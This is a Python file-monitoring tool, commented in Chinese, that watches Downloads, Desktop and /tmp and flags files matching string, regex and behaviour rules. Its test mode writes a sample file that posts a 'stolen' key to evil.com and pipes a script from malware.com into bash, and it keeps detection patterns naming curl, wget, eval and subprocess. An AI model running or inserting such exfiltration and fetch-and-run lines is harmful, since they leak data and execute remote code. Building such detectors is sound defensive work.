#!/usr/bin/env python3
"""
Round 12 - 文件监控模块

使用 watchdog 库实现跨平台文件监控
"""

import os
import sys
import time
import hashlib
import threading
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Callable, Dict

try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler, FileCreatedEvent, FileModifiedEvent
    WATCHDOG_AVAILABLE = True
except ImportError:
    WATCHDOG_AVAILABLE = False
    print("⚠️  watchdog 未安装，运行：pip install watchdog")

# ============== 配置 ==============

BASE_DIR = Path(__file__).parent.parent

# 默认监控目录
DEFAULT_WATCH_DIRS = [
    str(Path.home() / "Downloads"),
    str(Path.home() / "Desktop"),
    "/tmp",
]

# 排除模式
EXCLUDE_PATTERNS = [
    "*.tmp",
    "*.log",
    "*.swp",
    ".git/*",
    "__pycache__/*",
    "*.pyc",
]

# ============== 文件扫描器 ==============

class FileScanner:
    """文件扫描器 - 检测文件内容"""
    
    def __init__(self, rules_dir: Optional[Path] = None):
        self.rules_dir = rules_dir or (BASE_DIR / "rules" / "optimized")
        self.rules = []
        self._load_rules()
    
    def _load_rules(self):
        """加载规则"""
        import yaml
        
        self.rules = []
        for tier in ['L1', 'L2', 'L3']:
            rule_file = self.rules_dir / f"{tier}_rules.yaml"
            if rule_file.exists():
                with open(rule_file) as f:
                    data = yaml.safe_load(f)
                    if data and 'rules' in data:
                        self.rules.extend(data['rules'])
        
        print(f"📚 加载 {len(self.rules)} 条规则")
    
    def scan_file(self, file_path: str) -> Optional[Dict]:
        """扫描文件"""
        path = Path(file_path)
        
        # 检查文件是否存在
        if not path.exists():
            return None
        
        # 获取文件信息
        try:
            file_size = path.stat().st_size
            file_hash = self._calculate_hash(path)
        except Exception as e:
            print(f"  ⚠️  无法读取文件信息：{e}")
            return None
        
        # 跳过小文件 (<100 bytes)
        if file_size < 100:
            return None
        
        # 读取文件内容
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(1024 * 1024)  # 最多读 1MB
        except Exception as e:
            print(f"  ⚠️  无法读取文件内容：{e}")
            return None
        
        # 规则匹配
        return self._match_rules(content, path, file_hash, file_size)
    
    def _calculate_hash(self, path: Path) -> str:
        """计算文件哈希"""
        sha256 = hashlib.sha256()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def _match_rules(self, content: str, path: Path, file_hash: str, file_size: int) -> Optional[Dict]:
        """匹配规则"""
        import re
        
        for rule in self.rules:
            condition = rule.get('condition', {})
            metadata = rule.get('metadata', {})
            
            # L1: 简单字符串匹配
            if 'contains' in condition:
                for pattern in condition['contains']:
                    if pattern.lower() in content.lower():
                        return self._create_detection(path, file_hash, file_size, rule, metadata)
            
            # L2: 正则匹配
            if 'regex' in condition:
                for pattern in condition['regex']:
                    try:
                        if re.search(pattern, content, re.IGNORECASE):
                            return self._create_detection(path, file_hash, file_size, rule, metadata)
                    except re.error:
                        continue
            
            # L3: 行为匹配
            if 'behaviors' in condition:
                behaviors = condition['behaviors']
                if self._detect_behavior(content, behaviors):
                    return self._create_detection(path, file_hash, file_size, rule, metadata)
        
        return None
    
    def _detect_behavior(self, content: str, behaviors: List[str]) -> bool:
        """检测行为"""
        behavior_patterns = {
            'file_read': ['open(', 'read(', 'cat '],
            'file_write': ['write(', 'open.*w', '>>'],
            'network_request': ['requests.', 'urllib.', 'curl ', 'wget '],
            'code_execution': ['eval(', 'exec(', 'subprocess.'],
            'subprocess_spawn': ['subprocess.', 'os.system', 'Popen('],
        }
        
        for behavior in behaviors:
            patterns = behavior_patterns.get(behavior, [])
            for pattern in patterns:
                if pattern in content:
                    return True
        
        return False
    
    def _create_detection(self, path: Path, file_hash: str, file_size: int, 
                         rule: Dict, metadata: Dict) -> Dict:
        """创建检测结果"""
        return {
            'timestamp': datetime.now().isoformat(),
            'file_path': str(path),
            'file_hash': file_hash,
            'file_size': file_size,
            'attack_type': metadata.get('attack_type', 'unknown'),
            'severity': metadata.get('severity', 'medium'),
            'rule_id': rule.get('id', 'unknown'),
            'rule_name': rule.get('name', 'Unknown Rule'),
            'confidence': 0.85 + (0.1 if metadata.get('severity') == 'critical' else 0),
            'status': 'detected',
        }

# ============== 文件事件处理器 ==============

class SecurityFileHandler(FileSystemEventHandler):
    """安全文件事件处理器"""
    
    def __init__(self, scanner: FileScanner, callback: Optional[Callable] = None):
        super().__init__()
        self.scanner = scanner
        self.callback = callback
        self.event_queue = []
        self.lock = threading.Lock()
    
    def on_created(self, event):
        """文件创建事件"""
        if event.is_directory:
            return
        
        self._process_event(event, 'created')
    
    def on_modified(self, event):
        """文件修改事件"""
        if event.is_directory:
            return
        
        self._process_event(event, 'modified')
    
    def _process_event(self, event, event_type: str):
        """处理文件事件"""
        file_path = event.src_path
        
        # 检查排除模式
        if self._should_exclude(file_path):
            return
        
        print(f"\n📁 [{event_type.upper()}] {file_path}")
        
        # 扫描文件
        result = self.scanner.scan_file(file_path)
        
        if result:
            print(f"  🚨 检测到威胁!")
            print(f"     类型：{result['attack_type']}")
            print(f"     严重程度：{result['severity']}")
            print(f"     规则：{result['rule_name']}")
            
            # 回调通知
            if self.callback:
                self.callback(result)
            
            # 记录事件
            with self.lock:
                self.event_queue.append(result)
        else:
            print(f"  ✅ 安全")
    
    def _should_exclude(self, file_path: str) -> bool:
        """检查是否应该排除"""
        from fnmatch import fnmatch
        
        path = Path(file_path)
        
        # 检查排除模式
        for pattern in EXCLUDE_PATTERNS:
            if fnmatch(path.name, pattern):
                return True
            if fnmatch(str(path), pattern):
                return True
        
        # 检查隐藏文件
        if path.name.startswith('.'):
            return True
        
        return False
    
    def get_events(self) -> List[Dict]:
        """获取事件队列"""
        with self.lock:
            events = self.event_queue.copy()
            self.event_queue.clear()
            return events

# ============== 文件监控器 ==============

class FileWatcher:
    """文件监控器"""
    
    def __init__(self, watch_dirs: Optional[List[str]] = None):
        self.watch_dirs = watch_dirs or DEFAULT_WATCH_DIRS
        self.scanner = FileScanner()
        self.observer = None
        self.handler = None
        self.running = False
        self.alert_callback = None
    
    def set_alert_callback(self, callback: Callable):
        """设置告警回调"""
        self.alert_callback = callback
    
    def start(self, blocking: bool = False):
        """启动监控"""
        if not WATCHDOG_AVAILABLE:
            print("❌ watchdog 未安装，无法启动监控")
            return
        
        print("=" * 60)
        print("🔍 Round 12 - 文件监控启动")
        print("=" * 60)
        
        # 创建处理器
        self.handler = SecurityFileHandler(self.scanner, self.alert_callback)
        
        # 创建观察者
        self.observer = Observer()
        
        # 添加监控目录
        for dir_path in self.watch_dirs:
            path = Path(dir_path).expanduser()
            if path.exists():
                self.observer.schedule(self.handler, str(path), recursive=False)
                print(f"  ✅ 监控目录：{path}")
            else:
                print(f"  ⚠️  目录不存在：{path}")
        
        # 启动
        self.observer.start()
        self.running = True
        
        print("\n✅ 文件监控已启动")
        print("按 Ctrl+C 停止监控\n")
        
        if blocking:
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()
    
    def stop(self):
        """停止监控"""
        print("\n🛑 停止监控...")
        self.running = False
        if self.observer:
            self.observer.stop()
            self.observer.join()
        print("✅ 监控已停止")
    
    def get_recent_events(self, limit: int = 10) -> List[Dict]:
        """获取最近事件"""
        if self.handler:
            return self.handler.get_events()[-limit:]
        return []

# ============== 主函数 ==============

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Round 12 文件监控")
    parser.add_argument('--watch', '-w', action='append', help='监控目录')
    parser.add_argument('--test', action='store_true', help='测试扫描')
    parser.add_argument('--list', action='store_true', help='列出默认监控目录')
    
    args = parser.parse_args()
    
    if args.list:
        print("📁 默认监控目录:")
        for dir_path in DEFAULT_WATCH_DIRS:
            path = Path(dir_path).expanduser()
            exists = "✅" if path.exists() else "❌"
            print(f"  {exists} {path}")
        return
    
    if args.test:
        print("🧪 测试文件扫描...")
        scanner = FileScanner()
        
        # 创建测试文件
        test_file = Path("/tmp/test_security_scan.py")
        test_content = """
import requests
import subprocess

# 测试恶意代码
requests.post("http://evil.com/collect", data={"key": "stolen"})
subprocess.run(["curl", "http://malware.com/script.sh | bash"], shell=True)
"""
        test_file.write_text(test_content)
        print(f"  创建测试文件：{test_file}")
        
        # 扫描
        result = scanner.scan_file(str(test_file))
        if result:
            print(f"\n  🚨 检测到威胁:")
            print(f"     类型：{result['attack_type']}")
            print(f"     严重程度：{result['severity']}")
            print(f"     规则：{result['rule_name']}")
        else:
            print("\n  ✅ 未检测到威胁")
        
        # 清理
        test_file.unlink()
        print(f"\n  清理测试文件")
        return
    
    # 启动监控
    watch_dirs = args.watch if args.watch else None
    watcher = FileWatcher(watch_dirs)
    
    # 设置告警回调
    def on_alert(result):
        print(f"\n  🚨 ALERT: {result['rule_name']}")
    
    watcher.set_alert_callback(on_alert)
    watcher.start(blocking=True)

if __name__ == "__main__":
    main()
